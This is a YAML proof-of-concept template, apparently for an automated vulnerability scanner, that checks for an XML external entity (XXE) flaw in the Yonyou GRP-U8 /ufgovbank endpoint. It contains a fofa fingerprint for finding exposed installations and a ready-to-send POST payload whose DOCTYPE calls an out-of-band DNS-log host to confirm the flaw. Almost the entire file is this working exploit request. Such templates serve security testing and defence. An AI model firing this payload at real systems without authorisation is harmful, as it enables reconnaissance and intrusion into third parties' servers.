id: poc-yaml-grp-u8-ufgovbank-xxe
info:
  name: 用友GRP-U8 ufgovbank XML实体注入漏洞
  severity: medium
  tags:
  - DNSLOG
  - xxe
  finger: GRP-U8
  fofa: body="GRP-U8"
variables:
  reverse: new_dns_log()
  domain: reverse.Domain()
requests:
- method: POST
  path: /ufgovbank
  headers:
    Content-Type: application/x-www-form-urlencoded
  data: 'reqData=<?xml version="1.0"?>

    <!DOCTYPE foo SYSTEM "http://{{.domain}}">&signData=1&userIP=1&srcFlag=1&QYJM=0&QYNC=adaptertest

    '
  expression: reverse.Verify()
transport: http
